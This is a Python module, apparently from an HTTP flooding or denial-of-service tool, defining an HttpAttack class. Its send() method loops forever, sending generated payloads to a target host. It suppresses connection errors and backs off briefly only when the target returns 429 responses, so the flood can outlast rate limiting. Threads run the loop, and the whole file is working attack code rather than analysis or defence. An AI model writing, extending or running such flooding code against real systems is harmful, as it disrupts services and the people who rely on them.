import logging
from contextlib import suppress
from http import HTTPStatus
from threading import Thread
from time import sleep

import requests
from attacks.http.services import HttpService
from shared.attacks import AttackRequest


class HttpAttack:
    def __init__(self, attack_request: AttackRequest) -> None:
        self._service: HttpService = HttpService(attack_request)
        self._attack_request: AttackRequest = attack_request
        self._payload_size: int = self._attack_request.size.value
        self._payload_decrease_step: int = 10

        if self._attack_request.http_meta:
            self._http_meta = self._attack_request.http_meta
        else:
            raise ValueError("HTTP attack metadata should be specified")

    def send(self):
        if self._attack_request.http_meta is None:
            raise ValueError("HTTP attack metadata should be specified")

        http_method = self._http_meta.method.value.lower()
        make_request = getattr(requests, http_method)
        host = "://".join(
            (
                self._attack_request.http_meta.schema.value,
                self._attack_request.target.address,
            )
        )
        requests_count = 0

        with suppress(requests.ConnectTimeout, requests.ConnectionError):
            while True:
                payload = self._service.get_http_payload(self._http_meta.payload)
                resp = make_request(host, payload, headers=self._service.http_headers)
                requests_count += 1
                if requests_count % 100 == 0:
                    requests_count = 0
                    print("[+] Checking bad status codes")
                    if resp.status_code in [HTTPStatus.TOO_MANY_REQUESTS]:
                        sleep(2)

    def run(self) -> None:
        """Create and return packet to send"""
        THREADS_AMOUNT = 1

        threads = [Thread(target=self.send) for _ in range(THREADS_AMOUNT)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        if self._payload_size != self._attack_request.size.value:
            logging.warning(f"Payload size was decreased to {self._payload_size} bits")
